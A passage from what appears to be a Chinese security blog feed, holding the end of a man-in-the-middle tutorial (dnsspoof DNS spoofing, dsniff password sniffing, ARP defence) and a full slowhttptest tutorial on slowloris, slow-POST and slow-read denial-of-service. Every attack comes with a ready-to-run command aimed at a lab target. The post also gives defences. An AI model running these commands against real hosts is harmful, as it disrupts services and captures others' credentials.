<h3 id="3-通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）"><a href="#3-通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）" class="headerlink" title="3. 通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）"></a>3. 通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）</h3><blockquote>
<p>echo “192.168.1.1 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/D629EE7E17F44A9A803ACB69C033C84D/2508" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/BA103D2F3E06414A9A43642A6D56F8DF/2523" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/A1E52A5BCF1A431DBDA7328944F75AD7/2507" alt="image"></p>
<h3 id="4-通过dsniff嗅探密码"><a href="#4-通过dsniff嗅探密码" class="headerlink" title="4. 通过dsniff嗅探密码"></a>4. 通过dsniff嗅探密码</h3><p>dsniff -cm</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/2D8DEC9950A544348C5477C423AFBC5A/2530" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/8D9B375121464E8D831303CE165B76ED/2531" alt="image"></p>
<hr>
<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04. 防御措施"></a>0x04. 防御措施</h2><h4 id="emsp-emsp-关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。"><a href="#emsp-emsp-关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。" class="headerlink" title="&emsp;&emsp;关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。"></a>&emsp;&emsp;关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。</h4><p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/B93990F9060945D6A979792AFE2BFB69/2542" alt="image"></p>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-祝大家国庆快乐！！"><a href="#emsp-emsp-祝大家国庆快乐！！" class="headerlink" title="&emsp;&emsp;祝大家国庆快乐！！"></a>&emsp;&emsp;祝大家国庆快乐！！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-MITM简介&quot;&gt;&lt;a href=&quot;#0x00-MITM简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. MITM简介&quot;&gt;&lt;/a&gt;0x00. MITM简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-中间人攻击-MITM-是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。&quot;&gt;&lt;a href=&quot;#emsp-emsp-中间人攻击-MITM-是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;中间人攻击(MITM)是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;中间人攻击(MITM)是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Slowhttptest</title>
    <link href="http://TimeS0ng.github.io/2017/09/29/Slowhttptest/"/>
    <id>http://TimeS0ng.github.io/2017/09/29/Slowhttptest/</id>
    <published>2017-09-28T16:31:41.000Z</published>
    <updated>2017-09-28T16:39:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Slowhttptest简介"><a href="#0x00-Slowhttptest简介" class="headerlink" title="0x00. Slowhttptest简介"></a>0x00. Slowhttptest简介</h2><h4 id="emsp-emsp-Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式-slowloris、slow-http-post、slow-read-attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。"><a href="#emsp-emsp-Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式-slowloris、slow-http-post、slow-read-attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。" class="headerlink" title="&emsp;&emsp;Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式(slowloris、slow http post、slow read attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。"></a>&emsp;&emsp;Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式(slowloris、slow http post、slow read attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。</h4><a id="more"></a>
<hr>
<h2 id="0x01-Slowhttptest安装"><a href="#0x01-Slowhttptest安装" class="headerlink" title="0x01. Slowhttptest安装"></a>0x01. Slowhttptest安装</h2><h3 id="1-Mac安装命令"><a href="#1-Mac安装命令" class="headerlink" title="1. Mac安装命令"></a>1. Mac安装命令</h3><blockquote>
<p>brew update &amp;&amp; brew install slowhttptest</p>
</blockquote>
<h3 id="2-linux安装命令"><a href="#2-linux安装命令" class="headerlink" title="2.linux安装命令"></a>2.linux安装命令</h3><blockquote>
<p>apt-get update &amp;&amp; apt-get install slowhttptest</p>
</blockquote>
<h3 id="安装好Slowhttptest之后可以直接执行命令-Slowhttptest-检测是否成功安装-下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究"><a href="#安装好Slowhttptest之后可以直接执行命令-Slowhttptest-检测是否成功安装-下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究" class="headerlink" title="[*]安装好Slowhttptest之后可以直接执行命令 Slowhttptest 检测是否成功安装,下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究"></a>[*]安装好Slowhttptest之后可以直接执行命令 Slowhttptest 检测是否成功安装,下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究</h3><blockquote>
<p>git clone <a href="https://github.com/shekyan/slowhttptest" target="_blank" rel="external">https://github.com/shekyan/slowhttptest</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/B1E7D4EE813A432CA0E8C10F5BBA6B83/1993" alt="image"></p>
<hr>
<h1 id="0x02-Slowloris模式"><a href="#0x02-Slowloris模式" class="headerlink" title="0x02. Slowloris模式"></a>0x02. Slowloris模式</h1><h2 id="Slowloris攻击原理："><a href="#Slowloris攻击原理：" class="headerlink" title="Slowloris攻击原理："></a><strong>Slowloris</strong>攻击原理：</h2><h4 id="1-Slowloris也称为slow-headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击"><a href="#1-Slowloris也称为slow-headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击" class="headerlink" title="1. Slowloris也称为slow headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击"></a>1. Slowloris也称为slow headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击</h4><h4 id="2-正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时"><a href="#2-正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时" class="headerlink" title="2. 正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时"></a>2. 正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时</h4><h4 id="3-通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果"><a href="#3-通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果" class="headerlink" title="3. 通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果"></a>3. 通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果</h4><h3 id="如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"><a href="#如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS" class="headerlink" title="[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"></a>[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS</h3><hr>
<h2 id="Slowloris攻击实战"><a href="#Slowloris攻击实战" class="headerlink" title="Slowloris攻击实战"></a><strong>Slowloris</strong>攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="1-Mac端的Slowhttptest"><a href="#1-Mac端的Slowhttptest" class="headerlink" title="1. Mac端的Slowhttptest"></a>1. Mac端的Slowhttptest</h4><h4 id="2-靶机metasploitable-2-0-emsp-IP-192-168-1-103"><a href="#2-靶机metasploitable-2-0-emsp-IP-192-168-1-103" class="headerlink" title="2. 靶机metasploitable 2.0 &emsp;IP=192.168.1.103"></a>2. 靶机metasploitable 2.0 &emsp;IP=192.168.1.103</h4><h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><blockquote>
<p>ulimit -n 1024 &amp;&amp; slowhttptest -c 1000 -H -g -o /Users/apple1/Desktop/my_header_stats -i 10 -r 100 -t GET -u <a href="https://host.example.com/index.html" target="_blank" rel="external">https://host.example.com/index.html</a> -x 24 -p 3</p>
<h4 id="———————————————————"><a href="#———————————————————" class="headerlink" title="———————————————————"></a>———————————————————</h4><p>[ ulimit -n 1024 ] 指定同一时间能并发打开的文件数为 1024；&emsp;   [ -c 1000 ] 指定测试过程中与目标建立的连接数为1000；&emsp; [ -H ]  指定开始SlowLoris攻击模式并发送未完成的HTTP请求；&emsp;[ -g -o my_header_stats ] 让Slowhttptest生成CSV和HTML的报告文件,并指定路径／文件名 ；&emsp; [ -i 10 ] Specifies the interval between follow up data ；&emsp; [ -r 100 ]  指定连接速率为100/s ； &emsp;[ -t GET ] 通过GET方式连接 ； &emsp; [ -u <a href="https://host.example.com/index.html" target="_blank" rel="external">https://host.example.com/index.html</a> ]指定URL； &emsp; [ -x 24 ] 启用慢速读取测试； &emsp; [ -p 3 ] 官方：在判断server被DoS之前，发送连接请求之后，等待HTTP response的时间间隔为3S || 笔者：client发送request请求3S内没接收到server的response就标志服务器被DoS </p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/D3BC7F6FD23140DBB947B632A70D837B/2142" alt="image"></p>
<h3 id="可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告"><a href="#可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告" class="headerlink" title="[*]可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告"></a>[*]可以看到几秒钟web服务器的连接池就被占满无法访问，下面是生成的html报告</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/A198B372BDAD4A2E91DCED2BC84E0D66/2146" alt="image"></p>
<hr>
<h1 id="0x03-Slow-Http-Post模式"><a href="#0x03-Slow-Http-Post模式" class="headerlink" title="0x03. Slow Http Post模式"></a>0x03. Slow Http Post模式</h1><h2 id="Slow-Http-Post攻击原理"><a href="#Slow-Http-Post攻击原理" class="headerlink" title="Slow Http Post攻击原理"></a>Slow Http Post攻击原理</h2><h4 id="1-Slow-Http-Post也称作Slow-body-其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多"><a href="#1-Slow-Http-Post也称作Slow-body-其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多" class="headerlink" title="1. Slow Http Post也称作Slow body,其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多"></a>1. Slow Http Post也称作Slow body,其本质也是通过耗尽服务器的连接池来达到攻击目的，而且攻击过程和上面提到的Slowloris差不多</h4><h4 id="2-在Post攻击中http-header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容"><a href="#2-在Post攻击中http-header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容" class="headerlink" title="2. 在Post攻击中http header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容"></a>2. 在Post攻击中http header头是完整发送的，但是这里会利用header头里面的content-length字段，正常情况下content-length的长度就是所要发送的数据长度，但是攻击者可以定制client发送的content-length，于是如果攻击者发送一个content-length特别大的值，那么server就会等待后续没有传完的body内容</h4><h4 id="3-此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时"><a href="#3-此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时" class="headerlink" title="3. 此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时"></a>3. 此时攻击者会延迟发送后续的body甚至是不发送，但是server端依旧会在等待并为其保留连接池并持续等待后续信息直到连接超时</h4><h4 id="4-问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击"><a href="#4-问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击" class="headerlink" title="4. 问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击"></a>4. 问题来了，如果攻击者与服务器建立大量连接，而且都告诉server后续还要传输数据，那么server的连接池到达一定程度时就会被占满达到DoS攻击</h4><h3 id="如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"><a href="#如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS" class="headerlink" title="[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"></a>[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，于是开始付钱，先付了一毛，给收银员说等我找找钱放哪了再付剩下的钱，但是又一直找不到不给，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS</h3><hr>
<h2 id="Slow-Http-Post攻击实战"><a href="#Slow-Http-Post攻击实战" class="headerlink" title="Slow Http Post攻击实战"></a>Slow Http Post攻击实战</h2><blockquote>
<p>ulimit -n 4096 &amp;&amp; slowhttptest -c 3000 -B -g -o /Users/apple1/Desktop/my_body_stats -i 110 -r 100 -s 8192 -t GET -u <a href="http://host.example.com/loginform.html" target="_blank" rel="external">http://host.example.com/loginform.html</a> -x 10 -p 3</p>
<h4 id="————————————————–"><a href="#————————————————–" class="headerlink" title="————————————————–"></a>————————————————–</h4><p>[ -B ] 启用Slow Http Post模式发送未完成的HTTP消息体； &emsp; [ -s ] 指定content-length长度为8192；</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/215B04DDF5E647B488A009620A396817/2215" alt="image"></p>
<h3 id="下面是生成的报告"><a href="#下面是生成的报告" class="headerlink" title="[*]下面是生成的报告"></a>[*]下面是生成的报告</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/34A759088BA449CB9CED8D6E2BD90C12/2217" alt="image"></p>
<hr>
<h1 id="0x04-Slow-Read-attack模式"><a href="#0x04-Slow-Read-attack模式" class="headerlink" title="0x04. Slow Read attack模式"></a>0x04. Slow Read attack模式</h1><h2 id="Slow-Read-attack攻击原理"><a href="#Slow-Read-attack攻击原理" class="headerlink" title="Slow Read attack攻击原理"></a>Slow Read attack攻击原理</h2><h4 id="1-正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window-size来控制传输速率"><a href="#1-正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window-size来控制传输速率" class="headerlink" title="1. 正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window size来控制传输速率"></a>1. 正如名字所描述的那样，就是慢速读取server传输过来的数据，如果大家看过我的sockstress那篇文章可知client可以通过控制TCP的window size来控制传输速率</h4><h4 id="2-如果攻击者将window-size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池"><a href="#2-如果攻击者将window-size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池" class="headerlink" title="2. 如果攻击者将window size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池"></a>2. 如果攻击者将window size置为一个特别小的值，但是却又请求一个特别大的资源，那么服务器就会与这个连接进行长时间通信，如果建立的连接数足够大就会塞满server的连接池</h4><h4 id="3-当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求"><a href="#3-当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求" class="headerlink" title="3. 当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求"></a>3. 当server端缓冲区未发送的资源堆积过多时还会导致缓冲区溢出，也无法响应其他请求</h4><h4 id="4-正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满"><a href="#4-正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满" class="headerlink" title="4. 正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满"></a>4. 正如漏斗一样，漏斗口很小，但是我们却一个劲的往里面装沙子，这样迟早把漏斗涨满</h4><hr>
<h2 id="Slow-Read-attack攻击实战"><a href="#Slow-Read-attack攻击实战" class="headerlink" title="Slow Read attack攻击实战"></a>Slow Read attack攻击实战</h2><blockquote>
<p>ulimit -n 8000 &amp;&amp; slowhttptest -c 8000 -X -r 100 -g -o /Users/apple1/Desktop/my_header_stats -w 512 -y 1024 -n 5 -z 32 -k 3 -u <a href="https://host.example.com/resources/index.html" target="_blank" rel="external">https://host.example.com/resources/index.html</a> -p 3</p>
<h4 id="————————————————–-1"><a href="#————————————————–-1" class="headerlink" title="————————————————–"></a>————————————————–</h4><p>[ -X ] 指定使用Slow Read attack模式，缓慢读取HTTP响应请求； &emsp; [ -w 512 -y 1024 ] 指定window size大小为512~1024 byte； &emsp; [ -n 5 ] 指定读取数据的间隔为5S； &emsp; [ -z 32 ] 指定每次从接收数据的缓冲区中读取数据的长度为5 byte； &emsp; [ -k 3 ] 在同一连接中重复请求的次数为3次</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/2FDA2F17DE3F4B4F83D431FECF90E94B/2271" alt="image"></p>
<h3 id="这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令"><a href="#这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令" class="headerlink" title="[*]这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令"></a>[*]这次服务器不仅被DoS了，而且因为缓冲区溢出导致CPU被大量占用，导致无法执行其它系统命令</h3><p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/58E1534C04904F039062A35374EF529D/2275" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/B1142AF04FD44CEAA67BE9CFE983148F/2270" alt="image"></p>
<hr>
<h2 id="0x05-防御策略"><a href="#0x05-防御策略" class="headerlink" title="0x05. 防御策略"></a>0x05. 防御策略</h2><h4 id="1-将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。"><a href="#1-将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。" class="headerlink" title="1. 将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。"></a>1. 将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于URL的限制。</h4><h4 id="2-设置合理的连接超时时间"><a href="#2-设置合理的连接超时时间" class="headerlink" title="2. 设置合理的连接超时时间"></a>2. 设置合理的连接超时时间</h4><h4 id="3-定义最小传入数据速率，并删除比该速率慢的连接"><a href="#3-定义最小传入数据速率，并删除比该速率慢的连接" class="headerlink" title="3. 定义最小传入数据速率，并删除比该速率慢的连接"></a>3. 定义最小传入数据速率，并删除比该速率慢的连接</h4><h4 id="4-如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志"><a href="#4-如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志" class="headerlink" title="4. 如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志"></a>4. 如果Web服务器从相同的IP接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉IP并且记录日志</h4><blockquote>
<p>具体的防御策略大家可以参考这篇<a href="http://blog.shekyan.com/2011/11/how-to-protect-against-slow-http-attacks.html" target="_blank" rel="external">文章</a></p>
</blockquote>
<hr>
<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06. 结语"></a>0x06. 结语</h2><h4 id="emsp-emsp-笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！"><a href="#emsp-emsp-笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！" class="headerlink" title="&emsp;&emsp;笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！"></a>&emsp;&emsp;笔者的英文水平不是很好，但是这个工具国内资源又很少，不得不去看英文文章，所以可能有部分参数内容翻译不准确，还望大家多多指正！！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-Slowhttptest简介&quot;&gt;&lt;a href=&quot;#0x00-Slowhttptest简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. Slowhttptest简介&quot;&gt;&lt;/a&gt;0x00. Slowhttptest简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式-slowloris、slow-http-post、slow-read-attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。&quot;&gt;&lt;a href=&quot;#emsp-emsp-Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式-slowloris、slow-http-post、slow-read-attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式(slowloris、slow http post、slow read attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式(slowloris、slow http post、slow read attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
